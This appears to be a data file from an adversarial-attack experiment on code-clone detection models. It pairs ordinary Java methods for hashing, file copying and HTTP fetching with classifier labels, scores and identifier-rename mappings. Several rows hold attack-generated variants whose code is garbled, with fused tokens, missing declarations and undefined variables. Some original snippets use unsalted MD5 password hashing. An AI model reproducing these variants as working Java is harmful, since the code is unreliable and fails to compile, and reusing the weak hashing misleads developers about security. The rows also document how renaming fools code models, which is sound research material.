            newgen.presentation.component.Utility.getInstance().showBrowser(""file://"" + fname);
        } catch (Exception exp) {
            exp.printStackTrace(System.out);
            javax.swing.JOptionPane.showMessageDialog(null, ""<html>Could not establish connection with the server, <br>Please verify server name/IP adress, <br>Also check if NewGenLib server is running</html>"", ""Critical error"", javax.swing.JOptionPane.ERROR_MESSAGE);
        }
        return fname;
    }
",691,,LABEL_1,LABEL_0,,-4,"readGeoParserResult,recordContent,getGazeteerIds,ret,retries,reqPre,outputFormat,doc,url,reader",,,,0,,0,Greedy,1,0.001002951463063558,,[]
247,"    public static String hashPasswordForOldMD5(String password) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(password.getBytes(""UTF-8""));
            byte messageDigest[] = md.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                String hex = Integer.toHexString(0xFF & messageDigest[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
            throw new IllegalStateException(nsae.getMessage());
        } catch (UnsupportedEncodingException uee) {
            throw new IllegalStateException(uee.getMessage());
        }
    }
 <SPLIT>     public static String encrypt(final String pass) {
        try {
            final MessageDigest md = MessageDigest.getInstance(""SHA"");
            md.update(pass.getBytes(""UTF-8""));
            return new String(Base64.encodeBase64(md.digest()));
        } catch (final Exception e) {
            throw new RuntimeException(""No se pudo encriptar el password."", e);
        }
    }
",161,,LABEL_1,LABEL_1,LABEL_1,-1,"hashPasswordForOldMD5,password,md,messageDigest,hexString,i,hex",,,,0,,0,GA,2089,0.7494182586669922,failed,[]
248,"    public Song(String s) {
        StringTokenizer tokenizer = new StringTokenizer(s, "";"");
        free = false;
        title = tokenizer.nextToken();
        artist = tokenizer.nextToken();
        location = tokenizer.nextToken();
        rating = Integer.parseInt(tokenizer.nextToken());
        overplay = Integer.parseInt(tokenizer.nextToken());
        String temp = tokenizer.nextToken();
        tokenizer = new StringTokenizer(temp, "",[] "");
        tags = new ArrayList<String>();
        while (tokenizer.hasMoreTokens()) {
            tags.add(tokenizer.nextToken());
        }
        byte[] bytes = new byte[40];
        try {
            MessageDigest hasher = MessageDigest.getInstance(""SHA-1"");
            hasher.update(title.getBytes());
            hasher.update(artist.getBytes());
            bytes = hasher.digest();
        } catch (Exception e) {
            System.out.println(e);
        }
    }
 <SPLIT>     public static final synchronized String hash(String data) {
        if (digest == null) {
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException nsae) {
                System.err.println(""Failed to load the MD5 MessageDigest. "" + ""Jive will be unable to function normally."");
                nsae.printStackTrace();
            }
        }
        digest.update(data.getBytes());
        return toHex(digest.digest());
    }
",199,,LABEL_1,LABEL_1,LABEL_1,-1,"s,tokenizer,title,artist,location,rating,overplay,temp,tags,bytes,hasher",,,,0,,0,GA,3586,1.2918100436528523,failed,[]
249,"    public static String getFile(String serviceName, String wsdlLocation, String endpoint) throws AxisFault {
        mLog.debug(""Downloading WSDL file from: "" + wsdlLocation);
        mLog.debug(""Received endpoint: "" + endpoint);
        String fileLocation = null;
        try {
            String tempDir = System.getProperty(""java.io.tmpdir"");
            URL url = new URL(wsdlLocation);
            String WSDLFile = tempDir + File.separator + serviceName + "".wsdl"";
            String tmpWSDLFile = WSDLFile + "".tmp"";
            File inputFile = new File(WSDLFile);
            File tmpFile = new File(tmpWSDLFile);
            if (!inputFile.exists() || inputFile.length() == 0) {
                mLog.debug(""Downloading the WSDL"");
                inputFile.createNewFile();
                InputStream in = url.openStream();
                FileOutputStream out = new FileOutputStream(inputFile);
                URLConnection con = url.openConnection();
                int fileLength = con.getContentLength();
                ReadableByteChannel channelIn = Channels.newChannel(in);
                FileChannel channelOut = out.getChannel();
                channelOut.transferFrom(channelIn, 0, fileLength);
                channelIn.close();
                channelOut.close();
                out.flush();
                out.close();
                in.close();
                Document tmpDocument = XMLUtils.newDocument(new FileInputStream(inputFile));
                NodeList nl1 = tmpDocument.getElementsByTagName(""wsdlsoap:address"");
                for (int i = 0; i < nl1.getLength(); i++) {
                    Node node1 = nl1.item(i);
                    if (node1.getNodeName().equals(""wsdlsoap:address"")) {
                        ((Element) node1).setAttribute(""location"", endpoint);
                    }
                }
                FileOutputStream tmpOut = new FileOutputStream(tmpFile);
                XMLUtils.DocumentToStream(tmpDocument, tmpOut);
                tmpOut.flush();
                tmpOut.close();
                boolean retVal = inputFile.delete();
                if (retVal) {
                    retVal = tmpFile.renameTo(new File(WSDLFile));
                }
                mLog.debug(""Return Value: "" + retVal);
            } else {
                mLog.debug(""The WSDL is already at the ServiceProvider"");
            }
            fileLocation = WSDLFile;
        } catch (MalformedURLException mx) {
            mLog.error(""MalformedURLException: "" + mx.getMessage() + "", cause: "" + mx.getCause().getMessage());
            throw new AxisFault(mx.getMessage(), mx.getCause());
        } catch (IOException ix) {
            mLog.error(""IOException: "" + ix.getMessage() + "", cause: "" + ix.getCause().getMessage());
            throw new AxisFault(ix.getMessage(), ix.getCause());
        } catch (ParserConfigurationException px) {
            mLog.error(""ParserConfigurationException: "" + px.getMessage() + "", cause: "" + px.getCause().getMessage());
            throw new AxisFault(px.getMessage(), px.getCause());
        } catch (SAXException sx) {
            mLog.error(""SAXException: "" + sx.getMessage() + "", cause: "" + sx.getCause().getMessage());
            throw new AxisFault(sx.getMessage(), sx.getCause());
        }
        return fileLocation;
    }
 <SPLIT>     private String GetResponse(URL url) {
        String content = null;
        try {
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(false);
            conn.setRequestMethod(""GET"");
            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) content += line;
            } else {
            }
        } catch (MalformedURLException e) {
            e.getStackTrace();
        } catch (IOException e) {
            e.getStackTrace();
        }
        return content;
    }
",631,"    public static String loadFilename(String serviceName, String wdlDirectory, String enpoint) throws AxisFault {
        mLog.debug(""Downloading WSDL file from: "" + wdlDirectory);
        mLog.debug(""Received endpoint: "" + enpoint);
        String FILELocation = null;
        try {
            String tmpDir = System.getProperty(""java.io.tmpdir"");
            URL url = new URL(wdlDirectory);
            StringWDDLPathe = tmpDir + File.separator + serviceName + "".wsdl"";
            String tmpWDDLUrl = WDDLPath + "".tmp"";
            File inputPlace = new File(WDDLPath);
            FileuploadDocumente = new File(tmpWDDLUrl);
            if (!inputPlace.exists() || inputPlace.length() == 0) {
                mLog.debug(""Downloading the WSDL"");
                inputPlace.createNewFile();
                InputStream reader = url.openStream();
                FileOutputStream oline= new FileOutputStream(inputPlace);
                URLConnection con = url.openConnection();
                int contentlength = con.getContentLength();
                ReadableByteChannel chan channelConnhannels.newChannel(reader);
                FileChannel cchanout= line.getChannel();
                channechanoutferFrom(cha channelConn, contentlength);
                 channelConn.close();
                chanout.close();
                line.flush();
                line.close();
                reader.close();
                Document ttmpDocument= XMLUtils.newDocument(new FileInputStream(inputPlace));
                NodeList klFirst = tmpDocument.getElementsByTagName(""wsdlsoap:address"");
                for (int i = li; i < lilFirst.getLength(); li++) {
                    Node node1package91First.item(li);
                    if (package91.getNodeName().equals(""wsdlsoap:address"")) {
                        ((Element)package911).setAttribute(""location"", enpoint);
                    }
                }
                FileOutputStream tmpOut ptyInFileOutputStream(uploadDocument);
                XMLUtils.DocumentToStream(tmpDocument, ptyIn);
                ptyIn.flush();
                ptyIn.close();
                boolean rRETval= inputPlace.delete();
                if (RETval) {
                    retVal RETvaladDocument.renameTo(new File(WDDLPath));
                }
                mLog.debug(""Return Value: "" + RETval);
            } else {
                mLog.debug(""The WSDL is already at the ServiceProvider"");
            }
            FILELocation = WDDLPath;
        } catch (MalformedURLException mx) {
            mLog.error(""MalformedURLException: "" + mx.getMessage() + "", cause: "" + mx.getCause().getMessage());
            throw new AxisFault(mx.getMessage(), mx.getCause());
        } catch (IOException ix) {
            mLog.error(""IOException: "" + ix.getMessage() + "", cause: "" + ix.getCause().getMessage());
            throw new AxisFault(ix.getMessage(), ix.getCause());
        } catch (ParserConfigurationException px) {
            mLog.error(""ParserConfigurationException: "" + px.getMessage() + "", cause: "" + px.getCause().getMessage());
            throw new AxisFault(px.getMessage(), px.getCause());
        } catch (SAXException sx) {
            mLog.error(""SAXException: "" + sx.getMessage() + "", cause: "" + sx.getCause().getMessage());
            throw new AxisFault(sx.getMessage(), sx.getCause());
        }
        return FILELocation;
    }
",LABEL_0,LABEL_0,0.5079919695854187,1,"getFile,serviceName,wsdlLocation,endpoint,fileLocation,tempDir,url,WSDLFile,tmpWSDLFile,inputFile,tmpFile,in,out,con,fileLength,channelIn,channelOut,tmpDocument,nl1,i,node1,tmpOut,retVal",,,,10,"getFile:loadFilename,serviceName:serviceName,wsdlLocation:wdlDirectory,endpoint:enpoint,fileLocation:FILELocation,tempDir:tmpDir,url:url,WSDLFile:WDDLPath,tmpWSDLFile:tmpWDDLUrl,inputFile:inputPlace,tmpFile:uploadDocument,in:reader,out:line,con:con,fileLength:contentlength,channelIn: channelConn,channelOut:chanout,tmpDocument:tmpDocument,nl1:klFirst,i:li,node1:package91,tmpOut:ptyIn,retVal:RETval,",4,GA,4788,1.9116892576217652,ga,[]
250,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpURLConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpURLConnection.connect();
        response.setStatus(httpURLConnection.getResponseCode());
        logger.debug(""[status="" + httpURLConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> header : httpURLConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream inputStream = httpURLConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(inputStream, outputStream);
    }
 <SPLIT>     private File extractUninstallFiles(File _destPath, boolean upgrade, String lastVer) {
        File oldlog = null;
        try {
            boolean oldClassCopied = false;
            File destPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + VAGlobals.APP_VERSION);
            if (upgrade) {
                File lastVerPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + lastVer);
                if (destPath.equals(lastVerPath)) {
                    File bkdir = new File(destPath.getAbsolutePath() + "".bak"");
                    if (!destPath.renameTo(bkdir)) {
                        throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                    }
                    oldlog = new File(bkdir.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                    lastVerPath = bkdir;
                } else {
                    oldlog = new File(lastVerPath.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                }
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
                if (uInfo_.module) oldClassCopied = copyOldSetupClass(lastVerPath, destPath);
            } else {
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
            }
            dirty_ = true;
            File[] ls = destPath.listFiles();
            for (int i = 0; i < ls.length; i++) {
                if (!oldClassCopied) ls[i].delete(); else if (!ls[i].getPath().equals(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"")) ls[i].delete();
            }
            byte[] buf = new byte[0];
            int read = 0;
            if (!oldClassCopied && (installClassSize_ > 0 || jarOffset_ > 0)) {
                final File outClassFile = new File(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                if (outClassFile.exists() && !outClassFile.delete()) {
                    ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outClassFile.getName()));
                }
                final FileOutputStream out = new FileOutputStream(outClassFile);
                final FileInputStream in = new FileInputStream(fileWithArchive_);
                if (installClassOffset_ > 0) {
                    in.skip(installClassOffset_);
                }
                buf = new byte[0];
                if (installClassSize_ < 0) buf = new byte[(int) jarOffset_]; else buf = new byte[(int) installClassSize_];
                read = in.read(buf, 0, buf.length);
                out.write(buf, 0, read);
                out.close();
                in.close();
            }
            final FileInputStream in = new FileInputStream(fileWithArchive_);
            if (jarOffset_ > 0) {
                in.skip(jarOffset_);
            }
            JarInputStream jar = new JarInputStream(in);
            final File outJarFile = new File(destPath.getAbsolutePath() + File.separator + ""install.jar"");
            if (outJarFile.exists() && !outJarFile.delete()) {
                ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outJarFile.getName()));
            }
            JarOutputStream outJar = new JarOutputStream(new FileOutputStream(outJarFile));
            ZipEntry entry = jar.getNextEntry();
            final int bufSize = 32768;
            buf = new byte[bufSize];
            while (entry != null) {
                String entryName = entry.getName();
                if (entryName.equals(""com/memoire/vainstall/resources/vainstall.properties"")) {
                } else if (entryName.equals(installClassName_ + "".class"") && !oldClassCopied) {
                    FileOutputStream out = null;
                    try {
                        out = new FileOutputStream(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                        VAGlobals.copyStream(jar, out, buf);
                    } catch (IOException e) {
                        throw e;
                    } finally {
                        if (out != null) out.close();
                    }
                } else if (!entryName.endsWith("".zip"")) {
                    if (VAGlobals.DEBUG) VAGlobals.printDebug(""jar entry name "" + entryName);
                    ZipEntry outEntry = new ZipEntry(entryName);
                    CRC32 crc = new CRC32();
                    outJar.putNextEntry(outEntry);
                    int size = 0;
                    while ((read = jar.read(buf, 0, bufSize)) >= 0) {
                        size += read;
                        if (read == 0) {
                            Thread.yield();
                        } else {
                            outJar.write(buf, 0, read);
                            crc.update(buf, 0, read);
                        }
                    }
                    outEntry.setSize(size);
                    outEntry.setCrc(crc.getValue());
                    outJar.flush();
                    outJar.closeEntry();
                }
                jar.closeEntry();
                entry = jar.getNextEntry();
            }
            InputStream pin = getClass().getResourceAsStream(""resources/vainstall.properties"");
            Properties prop = new Properties();
            try {
                prop.load(pin);
            } catch (IOException exc) {
            }
            if (language == null) language = ""default"";
            prop.setProperty(""vainstall.destination.language"", language);
            ZipEntry outEntry = new ZipEntry(""com/memoire/vainstall/resources/vainstall.properties"");
            CRC32 crc = new CRC32();
            outEntry.setCrc(crc.getValue());
            outEntry.setSize(prop.size());
            outJar.putNextEntry(outEntry);
            prop.store(outJar, VAGlobals.NAME + "" "" + VAGlobals.VERSION);
            outEntry.setCrc(crc.getValue());
            outJar.closeEntry();
            jar.close();
            outJar.close();
            in.close();
        } catch (IOException e) {
            String message = e.getLocalizedMessage();
            message += ""\n"" + VAGlobals.i18n(""Setup_ErrorUninstallScripts"");
            e.printStackTrace();
            exitOnError(new IOException(message));
        }
        return oldlog;
    }
",335,"    @Override
    protected void  doPut(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection apacheGEConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        apacheGEConnection.connect();
        response.setStatus(apacheGEConnection.getResponseCode());
        logger.debug(""[status="" + apacheGEConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> hheader: apacheGEConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String sv : header.getValue()) {
                    if (sv != null) {
                        logger.debug(header.getKey() + "": "" + sv);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), sv);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream iresourceChannel= apacheGEConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(resourceChannel, outputStream);
    }
",LABEL_1,LABEL_1,0.6314008831977844,1,"doGet,request,response,rewrittenQueryString,rewrittenUrl,httpURLConnection,header,value,inputStream,outputStream",,,,24,"doGet: doPut,request:request,response:response,rewrittenQueryString:rewrittenQueryString,rewrittenUrl:rewrittenUrl,httpURLConnection:apacheGEConnection,header:header,value:sv,inputStream:resourceChannel,outputStream:outputStream,",6,GA,573,0.24113701184590658,ga,[]
251,"        public void runInternal() {
            connection = null;
            boolean itemsLoadedPartially = false;
            boolean loadNext = false;
            HashSet<String> visited = new HashSet<String>();
            do {
                try {
                    setProgressMessage(url.toString(), -1);
                    visited.add(url.toString());
                    long startTimeStamp = System.currentTimeMillis();
                    delayedProgress = coolReader.getEngine().showProgressDelayed(0, progressMessage, PROGRESS_DELAY_MILLIS);
                    URLConnection conn = url.openConnection();
                    if (conn instanceof HttpsURLConnection) {
                        onError(""HTTPs is not supported yet"");
                        return;
                    }
                    if (!(conn instanceof HttpURLConnection)) {
                        onError(""Only HTTP supported"");
                        return;
                    }
                    connection = (HttpURLConnection) conn;
                    connection.setRequestProperty(""User-Agent"", ""CoolReader/3(Android)"");
                    if (referer != null) connection.setRequestProperty(""Referer"", referer);
                    connection.setInstanceFollowRedirects(true);
                    connection.setAllowUserInteraction(false);
                    connection.setConnectTimeout(CONNECT_TIMEOUT);
                    connection.setReadTimeout(READ_TIMEOUT);
                    connection.setDoInput(true);
                    String fileName = null;
                    String disp = connection.getHeaderField(""Content-Disposition"");
                    if (disp != null) {
                        int p = disp.indexOf(""filename="");
                        if (p > 0) {
                            fileName = disp.substring(p + 9);
                        }
                    }
                    int response = -1;
                    response = connection.getResponseCode();
                    L.d(""Response: "" + response);
                    if (response != 200) {
                        onError(""Error "" + response);
                        return;
                    }
                    String contentType = connection.getContentType();
                    String contentEncoding = connection.getContentEncoding();
                    int contentLen = connection.getContentLength();
                    L.d(""Entity content length: "" + contentLen);
                    L.d(""Entity content type: "" + contentType);
                    L.d(""Entity content encoding: "" + contentEncoding);
                    setProgressMessage(url.toString(), contentLen);
                    InputStream is = connection.getInputStream();
                    delayedProgress.cancel();
                    is = new ProgressInputStream(is, startTimeStamp, progressMessage, contentLen, 80);
                    final int MAX_CONTENT_LEN_TO_BUFFER = 256 * 1024;
                    boolean isZip = contentType != null && contentType.equals(""application/zip"");
                    if (expectedType != null) contentType = expectedType; else if (contentLen > 0 && contentLen < MAX_CONTENT_LEN_TO_BUFFER) {
                        byte[] buf = new byte[contentLen];
                        if (is.read(buf) != contentLen) {
                            onError(""Wrong content length"");
                            return;
                        }
                        is.close();
                        is = null;
                        is = new ByteArrayInputStream(buf);
                        if (findSubstring(buf, ""<?xml version="") >= 0 && findSubstring(buf, ""<feed"") >= 0) contentType = ""application/atom+xml"";
                    }
                    if (contentType.startsWith(""application/atom+xml"")) {
                        L.d(""Parsing feed"");
                        parseFeed(is);
                        itemsLoadedPartially = true;
                        if (handler.docInfo.nextLink != null && handler.docInfo.nextLink.type.startsWith(""application/atom+xml;profile=opds-catalog"")) {
                            if (handler.entries.size() < MAX_OPDS_ITEMS) {
                                url = new URL(handler.docInfo.nextLink.href);
                                loadNext = !visited.contains(url.toString());
                                L.d(""continue with next part: "" + url);
                            } else {
                                L.d(""max item count reached: "" + handler.entries.size());
                                loadNext = false;
                            }
                        } else {
                            loadNext = false;
                        }
                    } else {
                        if (fileName == null) fileName = defaultFileName;
                        L.d(""Downloading book: "" + contentEncoding);
                        downloadBook(contentType, url.toString(), is, contentLen, fileName, isZip);
                        if (progressShown) coolReader.getEngine().hideProgress();
                        loadNext = false;
                        itemsLoadedPartially = false;
                    }
                } catch (Exception e) {
                    L.e(""Exception while trying to open URI "" + url.toString(), e);
                    if (progressShown) coolReader.getEngine().hideProgress();
                    onError(""Error occured while reading OPDS catalog"");
                    break;
                } finally {
                    if (connection != null) try {
                        connection.disconnect();
                    } catch (Exception e) {
                    }
                }
            } while (loadNext);
            if (progressShown) coolReader.getEngine().hideProgress();
            if (itemsLoadedPartially) BackgroundThread.guiExecutor.execute(new Runnable() {

                @Override
                public void run() {
                    L.d(""Parsing is finished successfully. "" + handler.entries.size() + "" entries found"");
                    callback.onFinish(handler.docInfo, handler.entries);
                }
            });
        }
 <SPLIT>     private String getEncoding() throws IOException {
        BufferedReader reader = null;
        String encoding = null;
        try {
            URLConnection connection = url.openConnection();
            Map<String, List<String>> header = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : header.entrySet()) {
                if (entry.getKey().toLowerCase().equals(""content-type"")) {
                    String item = entry.getValue().toString().toLowerCase();
                    if (item.contains(""charset"")) {
                        encoding = extractEncoding(item);
                        if (encoding != null && !encoding.isEmpty()) return encoding;
                    }
                }
            }
            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.toLowerCase();
                if (line.contains(""charset"") || line.contains(""encoding"")) {
                    encoding = extractEncoding(line);
                    if (encoding != null && !encoding.isEmpty()) return encoding;
                }
            }
            return STANDARDENCODING;
        } finally {
            if (reader != null) reader.close();
        }
    }
",898,,LABEL_1,LABEL_0,,-4,"runInternal,connection,visited,startTimeStamp,delayedProgress,conn,fileName,disp,p,response,contentType,contentEncoding,contentLen,is,url,loadNext,itemsLoadedPartially",,,,0,,0,Greedy,1,0.0010270476341247559,,[]
252,"    String getLocation(Class clazz) {
        try {
            java.net.URL url = clazz.getProtectionDomain().getCodeSource().getLocation();
            String location = url.toString();
            if (location.startsWith(""jar"")) {
                url = ((java.net.JarURLConnection) url.openConnection()).getJarFileURL();
                location = url.toString();
            }
            if (location.startsWith(""file"")) {
                java.io.File file = new java.io.File(url.getFile());
                return file.getAbsolutePath();
            } else {
                return url.toString();
            }
        } catch (Throwable t) {
        }
        return Messages.getMessage(""happyClientUnknownLocation"");
    }
 <SPLIT>     public static void setContenu(ContenuFichierElectronique contenuFichier, FichierElectronique fichierElectronique, UtilisateurIFGD utilisateurCourant) throws IOException, DocumentVideException {
        if (contenuFichier != null) {
            SupportDocument support = fichierElectronique.getSupport();
            support.setFichierElectronique(fichierElectronique);
            FicheDocument ficheDocument = support.getFicheDocument();
            String nomFichier = contenuFichier.getNomFichier();
            String extension = FilenameUtils.getExtension(nomFichier);
            if (ficheDocument.getFichierElectronique(nomFichier) != null) {
                FichierElectronique fichierElectroniqueExistant = ficheDocument.getFichierElectronique(nomFichier);
                if (fichierElectroniqueExistant.getId() != null && !fichierElectroniqueExistant.getId().equals(fichierElectronique.getId())) {
                    throw new FichierElectroniqueExistantException(nomFichier, ficheDocument);
                }
            }
            if (fichierElectronique.getId() == null) {
                if (OfficeDocumentPropertiesUtil.canWriteIdIGID(extension)) {
                    Long idIgid = OfficeDocumentPropertiesUtil.getIdIGID(contenuFichier);
                    if (idIgid != null) {
                        throw new FichierElectroniqueExistantException(nomFichier, idIgid, ficheDocument);
                    }
                }
            }
            InputStream inputStream = contenuFichier.getInputStream();
            OutputStream outputStream = fichierElectronique.getOutputStream();
            try {
                IOUtils.copy(inputStream, outputStream);
            } finally {
                try {
                    inputStream.close();
                } finally {
                    outputStream.close();
                }
            }
            String typeMime = contenuFichier.getContentType();
            long tailleFichier = contenuFichier.getTailleFichier();
            Date dateDerniereModification = new Date();
            fichierElectronique.setNom(nomFichier);
            fichierElectronique.setTypeMime(extension);
            creerFormatSiNecessaire(typeMime, extension);
            fichierElectronique.setTaille(tailleFichier);
            fichierElectronique.setDateDerniereModification(dateDerniereModification);
            fichierElectronique.setSoumetteur(utilisateurCourant);
            if (extension.endsWith(""msg"")) {
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, contenuFichier.getInputStream(), utilisateurCourant);
            } else if (extension.endsWith(""eml"")) {
                Map<String, Object> properties = new GestionnaireProprietesMimeMessageParser().parseMsg(contenuFichier.getInputStream());
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, properties, utilisateurCourant);
            } else {
                FGDProprietesDocumentUtils.copierMetadonneesProprietes(fichierElectronique, ficheDocument);
            }
        }
    }
",152,"    String newFile(Class clazz) {
        try {
            java.net.cl urclazzlazz.getProtectionDomain().getCodeSource().newFile();
            Stringrouten = cl.toString();
            if (route.startsWith(""jar"")) {
                cl = ((java.net.JarURLConnection) cl.openConnection()).getJarFileURL();
               routen = cl.toString();
            }
            if (route.startsWith(""file"")) {
                java.io.Filefilee = new java.io.File(cl.getFile());
                return file.getAbsolutePath();
            } else {
                return cl.toString();
            }
        } catch (Throwable t) {
        }
        return Messages.getMessage(""happyClientUnknownLocation"");
    }
",LABEL_0,LABEL_0,0.8339956998825073,1,"getLocation,clazz,url,location,file",,,,5,"getLocation:newFile,clazz:clazz,url:cl,location:route,file:file,",2,GA,259,0.09813044865926107,ga,[]
253,"    public static void copy(File in, File out) throws IOException {
        if (in.exists() && in != null && out != null) {
            if (!out.exists()) {
                if (in.isDirectory()) {
                    out.mkdirs();
                } else {
                    out.createNewFile();
                }
            }
            String source = in.isDirectory() ? ""directory"" : ""file"";
            String target = out.isDirectory() ? ""directory"" : ""file"";
            if (!source.equals(target)) {
                throw new IOException(""Can't duplicate "" + source + "" as "" + target);
            } else {
                if (source.equals(""directory"")) {
                    File[] files = in.listFiles();
                    for (File file : files) {
                        copy(file, new File(out, file.getName()));
                    }
                } else {
                    FileChannel inCh = new FileInputStream(in).getChannel();
                    FileChannel outCh = new FileOutputStream(out).getChannel();
                    inCh.transferTo(0, inCh.size(), outCh);
                }
            }
        }
    }
 <SPLIT>     public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",230,"    public static void copy(File url, File OUT) throws IOException {
        if (url.exists() && url != null && OUT != null) {
            if (!OUT.exists()) {
                if (url.isDirectory()) {
                    OUT.mkdirs();
                } else {
                    OUT.createNewFile();
                }
            }
            String surl= url.isDirectory() ? ""directory"" : ""base"";
            String base = OUT.isDirectory() ? ""directory"" : ""base"";
            if (!url.equals(base)) {
                throw new IOException(""Can't duplicate "" + url + "" as "" + base);
            } else {
                if (url.equals(""directory"")) {
                    File[] fkeys= url.listFiles();
                    for (Filebasee : keys) {
                        copy(base, new File(OUT, base.getName()));
                    }
                } else {
                    FileChannel iINChannel= new FileInputStream(url).getChannel();
                    FileChannel OutCh = new FileOutputStream(OUT).getChannel();
                    INChannel.transferTo(0, INChannel.size(), OutCh);
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.5052825212478638,1,"copy,in,out,source,target,files,file,inCh,outCh",,,,2,"copy:copy,in:url,out:OUT,source:url,target:base,files:keys,file:base,inCh:INChannel,outCh:OutCh,",1,GA,491,0.1803016463915507,ga,[]
254,"    private static void copyFile(File source, File dest) throws IOException {
        FileChannel srcChannel = new FileInputStream(source).getChannel();
        FileChannel dstChannel = new FileOutputStream(dest).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
    }
 <SPLIT>     private static void copy(String sourceName, String destName) throws IOException {
        File source = new File(sourceName);
        File dest = new File(destName);
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            long size = in.size();
            MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
            out.write(buf);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",69,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,source,dest,srcChannel,dstChannel",,,,0,,0,GA,1797,0.6352139274279277,failed,[]
255,"    public static byte[] getMD5(String source) {
        byte[] tmp = null;
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance(""MD5"");
            md.update(source.getBytes());
            tmp = md.digest();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return tmp;
    }
 <SPLIT>     public static String fetch(String reference) throws IOException {
        URL url = new URL(reference);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod(""GET"");
        c.setDoOutput(true);
        c.setRequestProperty(""Content-Type"", ""text/xml; charset=UTF-8"");
        return parseISToString(c.getInputStream());
    }
